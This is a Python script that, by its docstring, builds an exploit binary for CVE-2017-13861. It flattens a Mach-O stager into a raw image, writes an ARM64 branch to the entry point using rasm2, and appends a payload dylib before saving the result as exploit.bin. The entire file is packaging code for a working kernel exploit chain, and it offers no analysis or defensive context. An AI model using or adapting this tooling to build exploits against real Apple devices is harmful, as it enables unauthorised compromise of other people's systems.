#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Create exploit binary from Mach-O file for CVE-2017-13861

NOTE: This script requires:
- macholib Python library: pip install macholib
- radare2 for assembling the branch instruction
"""

import subprocess
import sys
from macholib.MachO import MachO


def main():
    if len(sys.argv) < 2:
        print("Usage: create_bin.py <stager_file>", file=sys.stderr)
        sys.exit(1)
    
    stager_file = sys.argv[1]
    
    try:
        with open(stager_file, 'rb') as f:
            data = f.read()
    except IOError as e:
        print(f"Error reading file: {e}", file=sys.stderr)
        sys.exit(1)
    
    try:
        macho = MachO(stager_file)
    except Exception as e:
        print(f"Error parsing Mach-O file: {e}", file=sys.stderr)
        sys.exit(1)
    
    start = -1
    min_addr = -1
    max_addr = 0
    
    for header in macho.headers:
        for cmd in header.commands:
            # Skip __PAGEZERO segment
            if hasattr(cmd[1], 'segname') and cmd[1].segname.decode('utf-8').rstrip('\x00') == '__PAGEZERO':
                continue
            
            if hasattr(cmd[1], 'vmaddr') and hasattr(cmd[1], 'vmsize'):
                segment = cmd[1]
                segname = segment.segname.decode('utf-8').rstrip('\x00')
                print(f"segment: {segname} {segment.vmaddr:x}")
                
                if min_addr == -1 or min_addr > segment.vmaddr:
                    min_addr = segment.vmaddr
                
                if max_addr < segment.vmaddr + segment.vmsize:
                    max_addr = segment.vmaddr + segment.vmsize
    
    print(f"data: {min_addr:x} -> {max_addr:x} {max_addr - min_addr:x}")
    output_data = bytearray(b'\x00' * (max_addr - min_addr))
    
    for header in macho.headers:
        for cmd in header.commands:
            if hasattr(cmd[1], 'segname'):
                segment = cmd[1]
                segname = segment.segname.decode('utf-8').rstrip('\x00')
                
                print(f"segment: {segname} off: {segment.offset:x} vmaddr: {segment.vmaddr:x} fileoff: {segment.fileoff:x}")
                
                # Process sections if they exist
                if hasattr(cmd[1], 'sections'):
                    for section in cmd[1].sections:
                        sectname = section.sectname.decode('utf-8').rstrip('\x00')
                        print(f"section: {sectname} off: {section.offset:x} addr: {section.addr:x} size: {section.size:x}")
                        
                        flat_addr = section.addr - min_addr
                        section_data = data[section.offset:section.offset + section.size]
                        
                        if section_data:
                            print(f"flat_addr: {flat_addr:x} ({len(section_data):x})")
                            if start == -1 or start > flat_addr:
                                start = flat_addr
                            output_data[flat_addr:flat_addr + len(section_data)] = section_data
    
    print(f"start: {start:x}")
    
    # Use rasm2 to generate branch instruction
    try:
        branch = subprocess.check_output(
            ['rasm2', '-b', '64', '-a', 'arm', f'b 0x{start:x}'],
            encoding='utf-8'
        ).strip()
        print(f"branch: {branch}")
        
        # Write branch instruction at the beginning
        branch_bytes = bytes.fromhex(branch[:8])
        output_data[0:4] = branch_bytes
    except subprocess.CalledProcessError as e:
        print(f"Error running rasm2: {e}", file=sys.stderr)
        print("Skipping branch instruction")
    except Exception as e:
        print(f"Error processing branch: {e}", file=sys.stderr)
        print("Skipping branch instruction")
    
    print(f"size: {len(output_data)}")
    
    # Add padding to reach dylib offset
    add_dylib = 0x10000
    padding = b'\x00' * (add_dylib - len(output_data))
    output_data = output_data + bytearray(padding)
    
    # Add payload dylib
    try:
        with open('payload.dylib', 'rb') as f:
            payload = f.read()
        output_data[add_dylib:add_dylib + len(payload)] = payload
    except IOError as e:
        print(f"Warning: Could not read payload.dylib: {e}", file=sys.stderr)
    
    print(f"final size: {len(output_data)}")
    
    with open('exploit.bin', 'wb') as f:
        f.write(output_data)
    
    print("Exploit binary written to exploit.bin")


if __name__ == "__main__":
    main()
